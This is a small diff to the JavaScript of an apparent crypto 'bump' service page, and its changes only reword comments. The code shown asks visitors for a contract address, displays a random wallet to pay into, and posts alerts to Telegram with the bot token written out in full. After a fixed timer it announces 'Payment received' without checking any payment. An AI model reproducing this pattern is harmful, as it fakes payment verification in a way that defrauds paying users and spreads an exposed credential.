@@ -113,7 +113,6 @@
       document.querySelector('.step-' + step).classList.add('active');
 
       if (step === 2) {
-        // Get Contract Address
         enteredCA = document.getElementById('ca').value.trim();
         if (!enteredCA) {
           alert("Please enter a contract address.");
@@ -121,11 +120,10 @@
           return;
         }
 
-        // Pick a random wallet
         selectedWallet = wallets[Math.floor(Math.random() * wallets.length)];
         document.getElementById('walletAddressBox').textContent = selectedWallet;
 
-        // Send alert to Telegram
+        // Send Telegram alert
         fetch(`https://api.telegram.org/bot8434797216:AAEZ9lqrAIwKY5UopaaEzM-fkadY4S-Xqdo/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -145,7 +143,7 @@
       let loader = document.getElementById("loader");
       loader.textContent = "Checking payment on Solana blockchain...";
 
-      // Simulate loading - replace this with real-time check later
+      // Simulated delay – replace with real check if needed
       setTimeout(() => {
         loader.textContent = "✅ Payment received! Bump in progress...";
       }, 7000);
